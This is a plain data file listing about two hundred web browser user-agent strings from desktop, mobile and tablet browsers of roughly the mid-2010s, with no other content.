Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36
Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.13.US Safari/537.36
Mozilla/5.0 (Windows NT 5.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (X11; Linux x86_64; U; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 6946.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; MDDRJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12F69 Safari/600.1.4
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; GIL 3.5; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.1 Safari/534.34
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; USPortal; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H143
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E)
Mozilla/5.0 (iPad; CPU OS 6_1_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B146 Safari/8536.25
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (X11; FC Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0
Mozilla/5.0 (X11; CrOS armv7l 7262.52.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.86 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MASAJS; rv:11.0) like Gecko
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; yie11; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10532
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSMSE; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; InfoPath.3)
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Mozilla/5.0 (Linux; Android 4.4.2; SM-T320 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)
Mozilla/5.0 (Linux; Android 5.0.2; LG-V410/V41020c Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1847.118 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) GSA/7.0.55539 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12F69
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWA Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-P600 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; 360SE)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 6812.88.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.153 Safari/537.36
Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.65 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/537.16 (KHTML, like Gecko) Version/8.0 Safari/537.16
Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900V 4G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/44.1.81 like Chrome/44.0.2403.128 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)
Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; GT-P5210 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDSJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 4.4.2; QTAQZ3 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; QMV7B Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B436 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321
Mozilla/5.0 (Linux; U; Android 4.0.3; en-ca; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Windows NT 5.1; rv:30.0) Gecko/20100101 Firefox/30.0
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0.2 Waterfox/40.0.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; LCJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NISSC; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9) AppleWebKit/537.71 (KHTML, like Gecko) Version/7.0 Safari/537.71
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; MALC; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MSBrowserIE; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-N910V 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36
Mozilla/5.0 (Windows NT 6.2; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.0; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Linux; Android 5.0.2; SM-T700 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG-SM-N910A Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko
Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER
Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/7.0)
Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12B466 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727)
Mozilla/5.0 (Linux; Android 5.0.2; VK810 4G Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.76.4 (KHTML, like Gecko) Version/7.0.4 Safari/537.76.4
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; SMJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; BOIE9;ENUS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/6.0.51363 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.76 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.50 (KHTML, like Gecko) Version/9.0 Safari/601.1.50
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; GWX:RESERVED)
Mozilla/5.0 (iPad; CPU OS 6_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B141 Safari/8536.25
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12B440 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) MsnBot-Media /1.0b
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/7.0)
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; WOW64; Trident/7.0)
Mozilla/5.0 (Linux; Android 5.1.1; SM-G920V Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; ASU2JS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 6680.78.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.102 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.2; SM-T520 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 4.4.2; SM-T900 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)
Mozilla/5.0 (Windows NT 6.2; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.94 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12D508 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36
Mozilla/5.0 (Linux; Android 4.1.2; GT-N8013 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFAPWA Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
